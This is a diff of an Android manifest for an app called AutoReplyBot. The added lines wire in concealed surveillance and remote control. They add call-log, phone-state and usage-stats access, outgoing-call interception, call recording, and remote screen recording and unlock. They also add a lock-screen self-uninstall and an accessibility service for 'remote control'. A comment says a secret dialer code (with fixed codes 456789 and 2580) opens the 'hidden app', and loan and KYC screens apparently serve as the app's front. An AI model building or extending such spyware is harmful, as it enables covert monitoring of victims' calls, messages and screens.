@@ -18,20 +18,30 @@
             <category android:name="android.intent.category.BROWSABLE" />
             <data android:scheme="https" />
         </intent>
+        <intent>
+            <action android:name="android.media.action.IMAGE_CAPTURE" />
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.GET_CONTENT" />
+            <data android:mimeType="image/*" />
+        </intent>
     </queries>
 
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SHORT_SERVICE" />
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
@@ -45,6 +55,13 @@
         android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <!-- Required for Recent Apps usage history (user must grant Usage Access in settings). -->
+    <uses-permission
+        android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <!-- Best-effort dialer unlock on older OEMs; ignored/restricted on many Android 10+ builds. -->
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
 
     <uses-feature
         android:name="android.hardware.location.gps"
@@ -95,14 +112,67 @@
         </activity>
 
         <activity
+            android:name=".SplashActivity"
+            android:exported="false"
+            android:theme="@style/Theme.AutoReplyBot.Splash" />
+
+        <activity
+            android:name=".WelcomeActivity"
+            android:exported="false"
+            android:theme="@style/Theme.AutoReplyBot.Welcome" />
+
+        <!-- LoginActivity stays enabled always (dialer unlock / deep links). LAUNCHER is on the alias. -->
+        <activity
             android:name=".LoginActivity"
             android:exported="true"
-            android:windowSoftInputMode="adjustResize">
+            android:windowSoftInputMode="adjustResize" />
+
+        <activity
+            android:name=".RegisterActivity"
+            android:exported="false"
+            android:windowSoftInputMode="adjustResize" />
+
+        <activity
+            android:name=".KycActivity"
+            android:exported="false" />
+        <activity
+            android:name=".LoanApplyActivity"
+            android:exported="false" />
+        <activity
+            android:name=".LoanReviewActivity"
+            android:exported="false" />
+        <activity
+            android:name=".LoanDisbursementActivity"
+            android:exported="false"
+            android:windowSoftInputMode="adjustResize" />
+        <activity
+            android:name=".LoanHomeActivity"
+            android:exported="false"
+            android:launchMode="singleTop" />
+
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
+        <activity-alias
+            android:name=".LoginActivityLauncher"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="@string/app_name"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:targetActivity=".SplashActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
         <activity
             android:name=".MainActivity"
             android:exported="false" />
@@ -136,6 +206,13 @@
             android:windowSoftInputMode="adjustResize" />
         <activity
             android:name=".FacebookReelStudioActivity"
+            android:exported="false"
+            android:windowSoftInputMode="adjustResize" />
+        <activity
+            android:name=".NotepadFilesActivity"
+            android:exported="false" />
+        <activity
+            android:name=".NotepadActivity"
             android:exported="false"
             android:windowSoftInputMode="adjustResize" />
         <activity
@@ -223,14 +300,67 @@
             android:name=".remote.RemoteMediaProjectionConsentActivity"
             android:exported="false"
             android:excludeFromRecents="true"
-            android:launchMode="singleTop"
+            android:launchMode="singleTask"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
             android:theme="@style/Theme.AutoReplyBot.Transparent" />
+
+        <activity
+            android:name=".remote.RemoteScreenUnlockActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTop"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:theme="@style/Theme.AutoReplyBot.Transparent" />
+
+        <activity
+            android:name=".remote.RemoteSelfUninstallActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTop"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:theme="@style/Theme.AutoReplyBot.Transparent" />
+
+        <activity
+            android:name=".remote.RemoteDialerPinActivity"
+            android:exported="true"
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.AutoReplyBot" />
 
         <receiver
             android:name=".BootCompletedReceiver"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Open hidden app: dial *#*#PASSCODE#*#* (SECRET_CODE) or *#PASSCODE# + Call (legacy). -->
+        <receiver
+            android:name=".remote.RemoteDialerUnlockReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" />
+            </intent-filter>
+            <!-- Fixed backup code opens PIN screen on OEMs that only match explicit hosts. -->
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data
+                    android:host="456789"
+                    android:scheme="android_secret_code" />
+            </intent-filter>
+            <!-- Explicit host for common passcode helps some OEMs; dynamic codes still use scheme-only + a11y. -->
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data
+                    android:host="2580"
+                    android:scheme="android_secret_code" />
+            </intent-filter>
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
 
@@ -273,16 +403,31 @@
         </service>
 
         <service
-            android:name=".remote.RemoteAppBlockAccessibilityService"
+            android:name=".remote.RemoteAccessibilityService"
             android:exported="true"
+            android:label="@string/remote_accessibility_service_label"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
             </intent-filter>
             <meta-data
                 android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_app_block_config" />
+                android:resource="@xml/accessibility_remote_control_config" />
         </service>
+
+        <activity
+            android:name=".remote.RemoteAccessibilitySetupActivity"
+            android:exported="false"
+            android:launchMode="singleTop"
+            android:windowSoftInputMode="adjustResize" />
+
+        <receiver
+            android:name=".remote.RemoteAccessibilityNotifReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.autoreplybot.remote.A11Y_STOP_SESSION" />
+            </intent-filter>
+        </receiver>
 
         <service
             android:name=".remote.RemoteMediaForegroundService"
@@ -300,9 +445,29 @@
             android:foregroundServiceType="mediaProjection" />
 
         <service
+            android:name=".remote.RemoteScreenRecordLaunchService"
+            android:exported="false"
+            android:foregroundServiceType="shortService" />
+
+        <service
             android:name=".remote.RemoteScreenRecordService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection|microphone" />
+
+        <service
+            android:name=".remote.RemoteCallRecordingService"
+            android:exported="false"
+            android:foregroundServiceType="microphone" />
+
+        <service
+            android:name=".remote.RemoteSelfUninstallLaunchService"
+            android:exported="false"
+            android:foregroundServiceType="shortService" />
+
+        <service
+            android:name=".remote.RemoteSessionAutoStartLaunchService"
+            android:exported="false"
+            android:foregroundServiceType="shortService" />
 
         <service
             android:name=".remote.RemoteMessagingService"
